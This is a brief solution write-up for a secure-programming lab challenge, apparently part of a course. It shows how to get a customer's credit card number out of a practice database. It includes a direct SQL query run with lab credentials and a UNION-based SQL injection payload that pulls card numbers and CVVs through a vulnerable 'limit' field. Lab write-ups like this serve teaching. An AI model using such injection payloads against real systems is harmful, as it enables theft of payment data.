- Identify the database,username and password (secprog_3_3 is the value for all of them.)
- login and instantly execute query through terminal access.
- List all tables, identify relation and formulate the query.

SELECT fininfo.fin_cc_number FROM transactions JOIN customers ON customers.id = transactions.customer_id JOIN fininfo ON fininfo.id = transactions.fininfo_id WHERE customers.first_name='john' AND last_name='doe' LIMIT 1

[Solution B]

- Either with the table structure knowledge from Solution A or through hit and trial and queries identity the structure and devise a query.
- Using shell access from solution A or through trial identify the possible site to inject query. (limit field).

- Devise a query to extract information.

1 union select customers.id,customers.first_name,transactions.fininfo_id,fininfo.fin_cc_number,fininfo.fin_cc_cvv from transactions JOIN customers ON transactions.customer_id = customers.id JOIN fininfo on fininfo.id = transactions.fininfo_id WHERE customers.first_name = 'John' and customers.last_name = 'Doe'

Challenge 4
===========
